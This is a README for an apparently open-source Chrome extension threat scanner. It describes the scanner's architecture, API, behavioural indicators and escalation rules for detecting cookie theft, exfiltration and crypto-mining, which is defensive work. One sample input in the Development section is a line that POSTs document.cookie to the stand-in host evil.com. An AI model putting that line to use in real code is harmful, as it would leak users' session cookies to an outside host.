# MalXtension — Chrome Extension Threat Scanner

Detect malicious Chrome extensions before they harm you. Advanced static analysis with **two independent modules**:

```
extension-scanner-v3/
├── scan-engine/          ← Core analysis library (standalone, testable)
│   └── src/
│       ├── analyzer.js           # Orchestrator — runs all sub-analyses
│       ├── constants.js          # Weights, thresholds, escalation rules
│       ├── index.js              # Public API exports
│       ├── analyzers/
│       │   ├── capability-scorer.js    # Permission risk scoring
│       │   ├── exposure-calculator.js  # Host-permission scope analysis
│       │   └── combination-rules.js    # Multi-factor escalation engine
│       ├── detectors/
│       │   ├── behavioral-detector.js  # AST + regex code analysis
│       │   └── obfuscation-detector.js # Entropy, density, encoding
│       └── utils/
│           └── helpers.js              # Shannon entropy, base64, etc.
│
├── extension/            ← Chrome Extension (UI + bundled engine)
│   ├── manifest.json
│   ├── popup.html / popup.js / styles.css
│   ├── background.js             # Service worker — CRX download
│   ├── content.js                # Web Store "Scan Security" button
│   ├── crx-parser.js             # CRX/ZIP extraction
│   └── lib/
│       └── scan-engine.bundle.js # ← Auto-generated from scan-engine/
│
├── scripts/
│   └── build-engine.js   # esbuild bundler script
├── package.json
└── README.md
```

---

## Quick Start

```bash
# 1. Install dependencies
npm install

# 2. Build scan engine → extension/lib/scan-engine.bundle.js
npm run build

# 3. Load extension in Chrome
#    → chrome://extensions → Developer mode → Load unpacked → select extension/
```

---

## Architecture

### Scan Engine (standalone library)

The scan engine is a **pure, side-effect-free static analysis library**. It has zero browser dependencies and can run in Node.js, Deno, or bundled for browser.

**Public API:**

```javascript
import { analyzeExtension, quickScan, exportResults } from './scan-engine/src/index.js';

// Full analysis
const report = await analyzeExtension(manifest, jsFiles);
// → { score, level, breakdown, details, summary, metadata }

// Quick scan (lightweight)
const quick = await quickScan(manifest, jsFiles);
// → { score, level, highRiskPermissions, concerns, duration }

// Export
const json = exportResults(report);
```

**Analysis Pipeline:**

```
manifest.json + JS files
        │
        ▼
┌─ Capability Scorer ──────────── permission weights (0-10)
├─ Exposure Calculator ────────── host scope multiplier (1.0-3.0×)
├─ Behavioral Detector ────────── AST + regex patterns (35+ indicators)
├─ Obfuscation Detector ───────── entropy, variables, base64, density
└─ Combination Rules Engine ───── 9 multi-factor escalation rules
        │
        ▼
  Final Score (0-100) → Risk Level (Low/Medium/High/Critical)
```

**v3 Enhancements over v2:**
- Browser fingerprinting detection (canvas, WebGL, audio, fonts)
- Crypto-mining pattern recognition
- WASM instantiation detection
- sendBeacon / form exfiltration tracking
- Shadow DOM (closed mode) detection
- iframe creation monitoring
- 9 escalation rules (up from 6)
- Severity levels on escalation rules
- Performance timing in metadata

### Extension (Chrome UI)

The extension **imports the bundled scan engine** — no simplified copy. It provides:

- **Web Store Scan** — paste any URL/ID, downloads CRX, extracts ZIP, runs full AST analysis
- **Installed Extensions** — scan any installed extension via `chrome.management`
- **Scan History** — persisted locally, shows past results
- **Content Script** — injects "Scan Security" button on Web Store detail pages
- **Export** — download or copy full JSON report

---

## Scan Engine API Reference

### `analyzeExtension(manifest, jsFiles)`

| Parameter | Type | Description |
|-----------|------|-------------|
| `manifest` | `Object` | Parsed manifest.json |
| `jsFiles` | `Array<{name, content}>` | JavaScript source files |

Returns a full `AnalysisResult` object:

```javascript
{
  score: 72,                    // 0-100
  level: 'High',                // Low | Medium | High | Critical
  breakdown: {
    capability: 18,             // Permission weight sum
    exposure: 54,               // Capability × exposure multiplier
    behavior: 42,               // Behavioral pattern score
    obfuscation: 15,            // Code obfuscation score
    combinations: 22,           // Escalation rule score
  },
  details: {
    capability: { ... },        // Per-permission weights
    exposure: { ... },          // Host analysis, multiplier
    behavioral: { ... },        // Each indicator with count/weight/score
    obfuscation: { ... },       // Entropy, variables, base64, density
    escalation: { ... },        // Triggered rules with conditions
  },
  summary: {
    concerns: [...],            // Human-readable warnings
    recommendations: [...],     // Action items
    keyFindings: [...],
  },
  metadata: {
    extensionName: '...',
    filesAnalyzed: 12,
    analysisDuration: 47,       // ms
    analysisDate: '2026-...',
  }
}
```

### `quickScan(manifest, jsFiles)`

Lightweight wrapper — returns only `score`, `level`, `concerns`, `duration`.

### `exportResults(results, includeDetails?)`

Serialises results to formatted JSON string.

---

## Behavioral Indicators (35+)

| Category | Patterns |
|----------|----------|
| **Code Execution** | eval, Function constructor, dynamic import, WASM |
| **Data Exfiltration** | fetch (external), WebSocket, XHR, sendBeacon, form submit |
| **Cookie/Storage** | document.cookie, chrome.cookies, localStorage, IndexedDB |
| **DOM Manipulation** | innerHTML, document.write, script injection, iframe, shadow DOM |
| **Fingerprinting** | canvas, WebGL, audio, font enumeration, screen, navigator |
| **Encoding** | atob/btoa, large base64, TextEncoder/Decoder |
| **Crypto** | mining patterns, subtle crypto |
| **Chrome APIs** | webRequest, tabs.executeScript, scripting.executeScript |

---

## Escalation Rules

| Rule | Severity | Score | Conditions |
|------|----------|-------|------------|
| COOKIE_EXFILTRATION | Critical | +25 | cookies + wildcard host + cookie API |
| BLOCKING_INTERCEPT | Critical | +30 | webRequestBlocking + external + obfuscation |
| NATIVE_BRIDGE | Critical | +35 | nativeMessaging + external connectivity |
| CRYPTO_MINING | Critical | +30 | mining pattern + WASM |
| SCRIPT_INJECTION_WILDCARD | High | +22 | scripting + broad access + executeScript |
| DATA_THEFT | Critical | +20 | history + cookies + external + all URLs |
| FINGERPRINT_EXFIL | High | +18 | fingerprinting + data exfiltration |
| STEALTH_COMMS | High | +20 | obfuscation + sendBeacon/WebSocket |
| EVAL_LIMITED | Medium | +10 | eval/Function + limited host scope |

---

## Development

```bash
# Build once
npm run build

# Watch mode (auto-rebuild on changes)
npm run dev

# Use scan engine as Node.js library
node -e "
  import('./scan-engine/src/index.js').then(async ({analyzeExtension}) => {
    const result = await analyzeExtension(
      { permissions: ['cookies','webRequest'], host_permissions: ['<all_urls>'] },
      [{ name: 'bg.js', content: 'fetch(\"https://evil.com\", {method:\"POST\", body: document.cookie})' }]
    );
    console.log(result.score, result.level, result.summary.concerns);
  });
"
```

---

## License

MIT
